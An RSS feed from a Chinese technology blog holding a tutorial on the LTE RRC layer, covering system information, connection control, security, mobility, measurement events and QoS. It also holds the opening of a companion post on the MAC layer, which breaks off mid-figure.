<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>所有文章 - TechKoala</title>
        <link>https://www.techkoala.top/posts/</link>
        <description>所有文章 | TechKoala</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>admin@techkoala.top (TechKoala)</managingEditor>
            <webMaster>admin@techkoala.top (TechKoala)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 31 Aug 2020 21:00:39 &#43;0800</lastBuildDate><atom:link href="https://www.techkoala.top/posts/" rel="self" type="application/rss+xml" /><item>
    <title>LTE 系列：RRC 层详解</title>
    <link>https://www.techkoala.top/lte_rrc/</link>
    <pubDate>Mon, 31 Aug 2020 21:00:39 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/lte_rrc/</guid>
    <description><![CDATA[<blockquote>
<p>LTE RRC 层详解</p>
</blockquote>
<h2 id="无线资源控制rrc">无线资源控制（RRC）</h2>
<p>无线资源控制（Radio Resource Control，RRC）层是 LTE 无线接入网协议中<strong>控制面</strong>部分的主要内容。</p>
<p>用户终端在进行数据通信之前，需要与网络建立承载信令消息的连接，通过信令消息的交互，控制数据通信的过程。因此，<strong>是否与网络建立了 RRC 连接</strong>是终端状态的判断依据。</p>
<ul>
<li><strong>RRC 连接状态</strong>即已经与网络建立了 RRC 连接的终端处于连接状态，此时终端可以进行<strong>数据传输</strong>、<strong>系统信息接收</strong>，以及<strong>邻小区的测量上报和小区切换</strong></li>
<li><strong>RRC 空闲状态</strong>即没有与网络建立 RRC 连接，那么终端处于空闲状态，此时终端<strong>不进行数据的传输</strong>，仍然需要执行的功能包括：<strong>系统信息的接收</strong>、<strong>侦听寻呼</strong>，以及<strong>邻小区测量和小区重选</strong></li>
</ul>
<p>RRC 协议包括以下的主要功能：</p>
<ul>
<li>系统信息的广播，包括接入网的系统广播消息，以及核心网非接入层（NAS）系统信息的广播</li>
<li>连接控制，包括信令承载（即 RRC 连接）的建立／重配置／重建立／释放、数据无线承载的建立／配置／释放，以及相关的完整性保护的数据加密的安全机制</li>
<li>移动性管理，包括配置终端的测量和上报，以及终端的小区选择、重选、寻呼和切换过程</li>
<li>服务质量（QoS）管理</li>
<li>NAS 信令直接传输的功能</li>
</ul>
<h3 id="系统信息的广播">系统信息的广播</h3>
<p>系统信息描述网络的基本情况，采用广播的方式进行发送，对应于广播控制逻辑信道（BCCH）。终端通过对系统信息的接收，获得在系统中进行通信所需要的基本网络参数。</p>
<p>LTE 的系统信息分为：</p>
<ul>
<li>
<p><code>主信息块</code>（Master Information Block，MIB）</p>
<p><strong>主信息块</strong>（MIB）包括小区最基本的物理层信息，例如：系统下行信号的带宽、无线帧序号和发送天线的数目。终端需要获得这些基本的信息才能够进一步接收系统的其他信息。</p>
<p><code>MIB</code> 信息在专门定义的广播传输信道（BCH）上，采用物理层广播信道（PBCH）在固定的时间和频率位置进行传输。<code>MIB</code> 采用 40ms 的周期重复发送，每个周期之内包括 4 次间隔为 10ms 的传输，在序号 SFN%4=0 无线帧的第 0 个子帧开始每个周期的第一次传输，其余 3 次传输发生在随后 3 个无线帧的第 0 个子帧的位置。</p>
</li>
<li>
<p><code>系统信息块</code>（System Information Block，SIB）</p>
<p><strong>系统信息块</strong>（SIB）映射在下行共享传输信道（DL-SCH）上进行传输，采用 <code>SI-RNTI</code> 进行指示。根据所传输信息的不同，<code>SIB</code> 分为多种类型：<code>Type 1</code> ～ <code>Type 12</code></p>
<ul>
<li><code>SIB1</code>（Type 1 信息）：包括了是否允许终端接入小区的相关信息，例如系统的公众网络标识（PLMN）、小区标识、关闭的用户组（CSG）信息以及 TDD 系统上下行时隙比例的配置信息。SIB1 中还承载了其他系统信息块（SIB2 ～ SIB13）的调度信息</li>
<li><code>SIB2</code>：承载用于所有终端公共的无线资源配置信息，例如系统上行信号的频率／带宽、MBSFN 子帧、随机接入信道、寻呼信道、上行 sounding 导频和上行功率控制等的配置情况</li>
<li><code>SIB3</code> ～ <code>SIB8</code>：承载用于终端进行小区重选的相关参数，分别针对于同频、异频和异系统 3G/GSM/cdma2000 各种不同的情况。SIB9 指示关于家庭基站名字的信息</li>
<li><code>SIB10</code> ～ <code>SIB12</code>：用于公共灾害的警示服务，即地震和海啸警报系统（Earthquake and Tsunami Warning System，ETWS）和商用移动警报服务（Commercial MobileAlert Service，CMAS）</li>
</ul>
</li>
</ul>
<p><code>SIB1</code> 信息使用固定的时间位置进行传输，采用 80ms 的周期重复发送，每个周期之内包括 4 次间隔为 20ms 的传输，在序号 SFN%8=0 无线帧的第 5 个子帧开始每个周期的第一次传输，其余 3 次传输发生在随后 3 个序号为偶数的无线帧的第 5 个子帧的位置。</p>
<p>除了 <code>SIB1</code> 之外，其余的 <code>SIB</code> 消息映射在系统信息（System Information，SI）上进行传输，它们的映射关系可以进行灵活的配置，由 <code>SIB1</code> 中承载的调度信息进行指示。一个 <code>SIB</code> 消息只能映射在一个 <code>SI</code> 上进行传输，而一个 <code>SI</code> 可以包含多个具有相同周期的 <code>SIB</code> 消息。</p>
<p>系统广播信息向传输信道的映射如图所示:</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_22.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_22.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_22.webp" data-sub-html="<h2>系统广播信息向传输信道的映射</h2>">
        
    </a><figcaption class="image-caption">系统广播信息向传输信道的映射</figcaption>
    </figure>
<p>系统广播信息的更新采用<code>更新提示</code>和<code>信息更新</code>两个阶段的方式。</p>
<p>根据系统配置的更新周期（最小值为 640ms），当需要对系统广播消息进行更新的时候，系统在前一个更新周期使用寻呼消息提示用户，系统广播消息将发生改变，但是在这个更新周期中，仍然发送原来的系统信息。在下一个更新周期，将发送改变之后的系统信息，终端根据该信息进行更新。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_23.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_23.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_23.webp" data-sub-html="<h2>系统广播信息的更新</h2>">
        
    </a><figcaption class="image-caption">系统广播信息的更新</figcaption>
    </figure>
<h3 id="对连接的控制">对连接的控制</h3>
<p><strong>连接控制</strong>指的是对接入网中的无线承载进行控制的功能，包括<strong>信令承载的建立</strong>／<strong>重配置</strong>／<strong>重建立</strong>／<strong>释放</strong>、<strong>数据承载的建立</strong>／<strong>配置</strong>／<strong>释放</strong>，以及相关的<strong>完整性保护</strong>和<strong>数据加密</strong>的通信安全机制。</p>
<h4 id="连接管理">连接管理</h4>
<p>LTE 中一共定义了 3 个用于信令的无线承载（Signaling Radio Bearer，SRB）：</p>
<ul>
<li>
<p><code>SRB0</code> 用于承载公用控制逻辑信道（CCCH）的 RRC 消息</p>
</li>
<li>
<p><code>SRB1</code> 主要用于承载专用控制逻辑信道（DCCH）的 RRC 消息</p>
<p>通常所说的建立 RRC 连接指的是信令无线承载 SRB1 的建立。</p>
</li>
<li>
<p><code>SRB2</code> 用于承载专用控制逻辑信道（DCCH）的核心网非接入层（NAS）控制信息。</p>
</li>
</ul>
<p>终端开机在网络中进行注册之后处于空闲状态，终端首先建立传输 <code>RRC</code> 消息的信令承载 <code>SRB1</code>，终端进入 <code>RRC 连接状态</code>，然后，系统建立传输 <code>NAS</code> 消息的信令无线承载 <code>SRB2</code> 和传输数据的无线承载 <code>DRB</code>，由此可以开始进行数据的通信。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_24.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_24.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_24.webp" data-sub-html="<h2>RRC 连接建立的过程</h2>">
        
    </a><figcaption class="image-caption">RRC 连接建立的过程</figcaption>
    </figure>
<p>进入 <code>RRC 连接状态</code>之后，采用 <code>RRC 连接重配置</code>的过程来进行 <code>SRB2</code> 和 <code>DRB</code> 的建立和管理。</p>
<p>重配置过程在连接状态下对 RRC 连接进行更改，包括：</p>
<ul>
<li>建立／更改／释放无线承载，</li>
<li>进行小区切换的过程</li>
<li>建立／更改／释放终端的测量和上报</li>
</ul>
<p>对应于这些功能，RRC 连接重配置消息中可能携带的信息包括：</p>
<ul>
<li>无线资源的配置情况（无线承载、MAC 层和物理层），其中含有如下信息：
<ul>
<li>公共的配置信息，描述了移动性控制信息和系统信息中公共的无线资源配置情况，例如随机接入信道的参数、系统上行 sounding 导频配置和上行功率控制参数等静态的物理层配置信息</li>
<li>专用的配置信息，专用的配置信息用于无线承载的管理，例如<code> MAC 层</code>配置、<code>SPS 调度</code>以及专用的物理层配置等</li>
</ul>
</li>
<li>移动性控制的相关参数</li>
<li>无线测量的配置信息</li>
</ul>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_25.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_25.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_25.webp" data-sub-html="<h2>RRC 连接重配置的过程</h2>">
        
    </a><figcaption class="image-caption">RRC 连接重配置的过程</figcaption>
    </figure>
<p>按照 <code>RRC 连接重配置</code>消息中携带的配置信息，无线承载建立的过程包括建立一个 <code>PDCP 实体</code>、建立一个 <code>RLC 实体</code>，以及按照指定的逻辑信道标识建立一个逻辑信道。</p>
<p>与建立的过程相对应，当 <code>RRC 连接重配置</code>消息指示释放某个无线承载的时候，将释放相应的 <code>PDCP 实体</code>、<code>RLC 实体</code>和<code>逻辑信道</code>。通过 <code>RRC 连接</code>释放的过程，终端由 <code>RRC 连接状态</code>转变为<code>空闲状态</code>。这个过程释放 <code>RRC 连接</code>，包括所有已经建立的信令和数据的无线承载，以及所有的无线资源。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_26.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_26.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_26.webp" data-sub-html="<h2>RRC连接释放的过程</h2>">
        
    </a><figcaption class="image-caption">RRC连接释放的过程</figcaption>
    </figure>
<h4 id="通信安全的功能">通信安全的功能</h4>
<p>为了保证通信的安全，防止窃听、伪装等恶意行为，无线接入网的连接控制中包含安全通信的相关功能，包括：</p>
<ul>
<li>信令消息的完整性保护</li>
<li>信令消息加密</li>
<li>数据消息的加密</li>
</ul>
<p>在 <code>RRC</code> 连接建立的过程中，无线接入网从核心网取得终端用户的相关信息，然后可以使用安全模式激活的 RRC 消息设置用户密钥和加密算法，开启信令完整性保护和加密的功能，从而保证后续通信过程的安全（包括 <code>SRB2</code> 和 <code>DRB</code> 的建立等）。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_27.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_27.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_27.webp" data-sub-html="<h2>安全模式激活的过程</h2>">
        
    </a><figcaption class="image-caption">安全模式激活的过程</figcaption>
    </figure>
<p>在通信的过程中还可以通过计数器检查（counter check）的 <code>RRC 消息</code>防止<code>中间人</code>（man in the middle）攻击。在计数器检查的过程中，网络发送计数器检查消息要求终端确认在每个数据无线承载 <code>DRB</code> 上发送和接收数据的数量，通过这样的方法可以排除<code>中间人</code>可能进行的伪装通信。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_28.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_28.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_28.webp" data-sub-html="<h2>计数器检查的过程</h2>">
        
    </a><figcaption class="image-caption">计数器检查的过程</figcaption>
    </figure>
<h3 id="终端移动性的管理">终端移动性的管理</h3>
<p>终端移动性的管理是 LTE 作为移动通信系统一个重要的控制功能，实现相关功能的协议包括:</p>
<ul>
<li>终端与无线接入网之间的 RRC 控制协议</li>
<li>终端与核心网之间非接入层（NAS）控制协议</li>
</ul>
<h4 id="空闲状态终端的移动性管理">空闲状态终端的移动性管理</h4>
<p>处于 <code>RRC 空闲状态</code>的终端与无线接入网没有建立 <code>RRC</code> 连接，终端的信息在核心网中注册并且分配有 <code>IP</code> 地址，无线接入网中不存储空闲状态终端的信息。终端进行自身的移动性管理，发起小区选择／重选，当跟踪区位置发生改变的时候向核心网进行登记。核心网记录终端所处的跟踪区位置（TrackingArea，TA，通常由相邻覆盖的若干个小区组成），核心网可以发起对终端的寻呼，终端根据核心网配置的 <code>DRX</code> 周期监听可能的寻呼消息。空闲状态的终端<strong>不能进行</strong>单播数据的传输。</p>
<p>在终端开机的过程中，首先根据 <code>PLMN</code>（公众网络标识）进行网络的选择，选定例如某个运营商的网络，之后终端进行小区选择，确定所驻留的小区，侦听该小区的控制信道。然后采用跟踪区改变的流程向核心网注册终端所处的跟踪区位置。</p>
<p>终端在移动的过程中，可能由一个小区无线信号的覆盖范围进入另一个小区的覆盖范围，这时候终端将进行小区重选的操作，改变所驻留侦听控制信道的小区。如果这个小区与前一个小区属于不同的跟踪区，那么在小区重选之后，终端将发起跟踪区改变的流程，使用非接入层（NAS）信令向核心网注册新的跟踪区位置。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_29.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_29.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_29.webp" data-sub-html="<h2>空闲状态终端的寻呼和跟踪区改变</h2>">
        
    </a><figcaption class="image-caption">空闲状态终端的寻呼和跟踪区改变</figcaption>
    </figure>
<p>当有呼叫到达或者是系统消息改变需要向空闲状态的终端发送寻呼消息的时候，核心网<code>移动控制实体</code>（MME）根据终端所注册的跟踪区位置，找到相对应的跟踪区列表，然后在列表中所有的跟踪区上，发送针对该终端的寻呼消息。</p>
<h4 id="连接状态终端的移动性管理">连接状态终端的移动性管理</h4>
<p>处于 <code>RRC 连接状态</code>的终端与无线接入网建立了 <code>RRC</code> 连接，终端的信息在核心网和无线接入网中都进行存储和管理。网络登记终端所处的小区位置，终端的移动性由网络采用切换的流程进行管理。<code>RRC 连接状态</code>的终端<strong>可以进行</strong>单播数据的传输。为了节省耗电，终端可以采用由无线接入网配置的 <code>DRX</code> 功能。</p>
<p><code>RRC 连接状态</code>终端的移动性由网络进行控制，网络根据无线接口的情况决定是否改变终端的服务小区，即切换的过程是由网络触发的。为了获取关于无线接口情况的信息，网络可以配置终端进行相关的测量和上报，然后根据上报的结果，触发切换的流程。另外，没有收到终端的测量与上报，网络也可以自行触发进行切换。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_30.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_30.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_30.webp" data-sub-html="<h2>连接状态终端的小区间切换</h2>">
        
    </a><figcaption class="image-caption">连接状态终端的小区间切换</figcaption>
    </figure>
<h5 id="切换过程">切换过程</h5>
<p>首先，由源服务小区配置终端进行相关的测量和上报，根据上报的信息，源服务小区判断终端是否需要进行切换并且选择目标小区，触发切换的信令流程：</p>
<ol>
<li>通过 <code>eNodeB</code> 之间互联的 <code>X2</code> 接口，源小区向目标小区发送切换请求的消息，该消息中包含了对于目标小区无线资源需求情况的信息。</li>
<li>如果目标小区确定可以接受终端进行切换，那么目标小区根据要求进行无线资源的准备，并向源小区反馈切换请求确认的消息，该消息包含终端接入目标小区时需要的信息，例如新的 <code>C-RNTI</code> 标识、目标小区的系统信息，以及分配的专用随机接入序列等。</li>
<li>源服务小区在收到目标小区对于切换请求的确认消息后，采用带有移动性控制信息的 <code>RRC</code> 连接重配置消息将这些来自目标小区的接入配置信息转发给终端，并且命令终端向目标小区进行切换。(<strong>注：</strong> 此时，因为来自核心网数据的传输路由还没有发生改变，源基站还可能负责将数据转发给目标基站。)</li>
<li>收到 RRC 连接重配置消息的切换命令后，终端根据指示的信息，向目标小区发起接入，采用随机接入的过程获得与目标小区的上行同步以及上行资源的分配。然后，在所分配的上行无线资源上，终端向目标小区发送 RRC 连接重配置完成消息，确认终端已经完成了切换，目标基站已经成为终端的服务基站，可以开始向终端发送数据。</li>
<li>无线接入网的切换完成后，目标基站将向核心网的<code>移动控制实体</code>（MME）发送<strong>路径切换请求</strong>，并由 <code>MME</code> 协调数据网管（SGW）完成用户数据传输路径的改变，核心网将数据路径转移到目标小区。</li>
<li>完成数据路径的转换后，目标小区向源小区发送终端上下文释放的消息，以此来确认成功地完成了整个切换的过程，源小区释放对应于该终端用户的相关资源。</li>
</ol>
<h4 id="配置终端的测量和上报">配置终端的测量和上报</h4>
<p>为了进行移动性管理的操作，终端需要根据网络的配置对无线信道的情况进行测量，包括：</p>
<ul>
<li>同频测量场景</li>
<li>异频测量场景</li>
<li>异系统的测量场景</li>
</ul>
<p>网络可以通过广播或者专用的控制信息配置终端的测量，对于空闲状态的终端，通过网络广播消息中配置的测量参数，终端完成小区选择／重选等移动性功能。对于 <code>RRC 连接状态</code>的终端，通过 <code>RRC 信令</code>（即 <code>RRC 连接重配置消息</code>）可以对终端进行专门的测量配置，终端向网络上报测量结果，协助网络进行小区切换的移动性管理。</p>
<p>在进行测量时，如果终端的源服务小区与目标小区工作在相同的载波频率，那么称为<code>同频测量</code>，例如采用频率复用系数等于 1 的同频组网的情况。进行同频测量，<strong>不需要测量间隔</strong>，也就是说，在对同频目标小区进行测量的时候，终端<strong>不需要中断</strong>对源服务小区的信号接收。</p>
<p>源服务小区和目标小区工作在不同载波频率的场景属于<code>异频测量</code>，为了对异频的目标小区进行测量，通常情况下需要配置测量间隔，终端<strong>中断</strong>对源小区的信号接收，将接收频率调整到目标小区进行测量。</p>
<p>对终端的测量进行配置的消息内容主要包括<code>测量的对象</code>和<code>测量上报的配置</code>。其中，每一个测量的对象对应于 LTE 系统内同频或者异频的一个载波频率，或者某一个载波频率上异系统 WCDMA 的一个小区列表。而每一个测量上报的配置包括测量上报的格式，例如上报多少个目标小区的测量结果，以及上报的触发条件，包括周期性上报和事件触发两种可能性。</p>
<p>适用于 LTE 系统内同频或者异频的场景一共定义有 5 种事件，包括：</p>
<ul>
<li>A1 事件，服务小区的信号质量优于某个设定的门限</li>
<li>A2 事件，服务小区的信号质量差于某个设定的门限</li>
<li>A3 事件，相邻小区的信号质量优于服务小区超过某个设定的门限</li>
<li>A4 事件，相邻小区的信号质量优于某个设定的门限</li>
<li>A5，服务小区的信号质量差于某个设定的门限的同时，相邻小区的信号质量优于某个设定的门限</li>
</ul>
<p>另外，针对与异系统之间的移动性操作，定义了两种事件：</p>
<ul>
<li>B1 事件，异系统相邻小区的信号质量优于某个设定的门限</li>
<li>B2 事件，服务小区的信号质量差于某个设定的门限的同时，异系统相邻小区的信号质量优于某个设定的门限</li>
</ul>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_31.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_31.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_31.webp" data-sub-html="<h2>终端测量上报的过程</h2>">
        
    </a><figcaption class="image-caption">终端测量上报的过程</figcaption>
    </figure>
<h3 id="服务质量qos管理">服务质量（QoS）管理</h3>
<p>LTE 系统中采用 <code>EPS 承载</code>为单位进行端到端的服务质量（QoS）管理。</p>
<p><code>EPS</code>（Evolved Packet System）承载是终端和分组数据网网关（P-GW）之间的连接，1 个 <code>EPS 承载</code>包括：</p>
<ul>
<li>1 个无线承载，即终端和 eNodeB 基站之间的连接</li>
<li>1 个 S1 承载，即 eNodeB 和服务网关（S-GW）之间的连接</li>
<li>1 个 S5/S8 承载，即 S-GW 和 P-GW 之间的连接。</li>
</ul>
<p>对于一个终端，网络可以建立<strong>多个</strong> <code>EPS 承载</code>，每个 <code>EPS 承载</code>可以有不同的 <code>QoS</code> 参数，因此除了在不同用户之间实现不同的 <code>QoS</code>，属于同一个用户的多个 <code>EPS 承载</code>也可以实现不同的 <code>QoS</code>，用于一个用户在同时进行的不同业务。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" data-sub-html="<h2>LTE 系统中的承载</h2>">
        
    </a><figcaption class="image-caption">LTE 系统中的承载</figcaption>
    </figure>
<p>针对每一个 <code>EPS 承载</code>，由核心网分配 <code>QoS 参数</code>，包括<code>QoS 类别标识</code>（QoS Class Identifier，QCI）和<code>分配和滞留优先级</code>（Allocation and Retention Priority，ARP）。</p>
<ul>
<li>QCI 参数描述了承载的 QoS 类别，每一种 QoS 类别都对应于一系列影响数据服务质量的具体系统参数，例如调度的加权、准入门限和排队门限，等等。</li>
<li>ARP 参数描述了承载的优先级，包括在资源受限的情况下是否允许建立承载，或者是否丢弃某个优先级较低的承载</li>
</ul>
<p>另外还有<code>保证数据速率</code>（Guaranteed Bit Rate，GBR）和<code>最大数据速率</code>（Maximum Bit Rate，MBR），这两个参数用于具有保证速率属性的承载。而对于不具有保证速率属性的承载，使用参数<code>最大总速率</code>（Aggregated Maximum Bit Rate，AMBR）来限制一个终端的所有不具有保证速率属性的承载的最大总速率。</p>
<p>根据核心网确定的 <code>QoS</code> 参数，无线接入网负责执行无线承载部分的 <code>QoS</code> 管理，例如无线资源的调度策略和排队管理策略等。</p>
<p>RRC 协议可以执行一部分 <code>QoS</code> 管理的功能，主要包括：半持续资源调度的配置，以及通过配置终端上行逻辑信道的优先级，实现对一个终端内多个上行承载的速率控制。</p>
<h3 id="核心网信令的直接传输">核心网信令的直接传输</h3>
<p>除了 RRC 协议信息之外，RRC 消息还可以用于承载核心网的非接入层（NAS）信息。采用所定义的上行／下行 NAS 信息直接传输的 RRC 过程，可以通过<code>隧道打包</code>的方式，在终端用户和网络核心网之间传输 NAS 信息。</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_32.webp" data-sub-html="<h2>上行（NAS）信息的直接传输</h2>">
        
    </a><figcaption class="image-caption">上行（NAS）信息的直接传输</figcaption>
    </figure>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_33.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_33.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_33.webp" data-sub-html="<h2>下行（NAS）信息的直接传输</h2>">
        
    </a><figcaption class="image-caption">下行（NAS）信息的直接传输</figcaption>
    </figure>]]></description>
</item><item>
    <title>LTE 系列：MAC 层详解</title>
    <link>https://www.techkoala.top/lte_mac/</link>
    <pubDate>Mon, 31 Aug 2020 21:00:31 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/lte_mac/</guid>
    <description><![CDATA[<blockquote>
<p>LTE MAC 层详解</p>
</blockquote>
<h2 id="媒体接入控制mac">媒体接入控制（MAC）</h2>
<p>媒体接入控制（Medium Access Control，MAC）层接收来自上层的 <code>RLC</code> 层的逻辑信道，经过处理后，以传输信道的方式输出到下层的物理层。</p>
<p>MAC 层的主要功能包括：</p>
<ul>
<li>逻辑信道向传输信道的映射与复用</li>
<li>根据不同优先级进行动态的资源调度</li>
<li>选择传输格式实现动态的速率自适应</li>
<li>混合自动重传（HybridAutomatic Repeat reQuest，HARQ）的纠错功能</li>
</ul>
<h3 id="逻辑信道">逻辑信道</h3>
<p>逻辑信道根据所传输的信息的类型进行定义。LTE 定义的逻辑信道包括：</p>
<ul>
<li>用于传输系统广播消息的<strong>广播控制信道</strong>（Broadcast Control CHannel，BCCH）</li>
<li>用于传输寻呼消息的<strong>寻呼控制信道</strong>（Paging Control CHannel，PCCH）</li>
<li>分别用于空闲状态和连接状态的终端传输控制信息的<strong>公用和专用控制信道</strong>（Common/ Dedicated Control CHannel，CCCH/DCCH）</li>
<li>用于传输用户数据信息的<strong>专用业务信道</strong>（Dedicated Traffic CHannel，DTCH）</li>
</ul>
<h3 id="传输信道">传输信道</h3>
<p>传输信道根据信息传输的方式进行定义。传输信道以<strong>传输块</strong>为单位在发送时间间隔（Transmission Time Interval，TTI）所定义的时间长度内进行每一次的发送，LTE 中设计的 <code>TTI</code> 长度是 1ms。每个传输块都有定义的传输格式，它由网络的调度功能动态地确定，包括传输块大小、调制方式和多天线方案等。</p>
<p>LTE 定义的传输信道包括：</p>
<ul>
<li><strong>广播信道</strong>（Paging CHannel，PCH），采用固定的传输格式，用于传输广播控制信道；</li>
<li><strong>上行共享信道／下行共享信道</strong>（Downlink/Uplink Shared CHannel，DL-SCH/UL-SCH），支持基于无线信道状态的实时调度、动态的速率自适应、HARQ 软合并和多天线空间复用的传输方式，是 LTE 进行上行和下行数据传输的主要的传输信道。</li>
</ul>
<p>在 LTE 空中接口 <code>MAC 层</code>协议功能的处理过程中，逻辑信道向传输信道以及最终的物理信道的映射关系如下所示：</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_9.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_9.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/WirelessCommunication/LTE/LTE_upper_layer_protocol/LTE_upper_layer_protocol_9.webp" data-sub-html="<h2>下行信道映射</h2>">
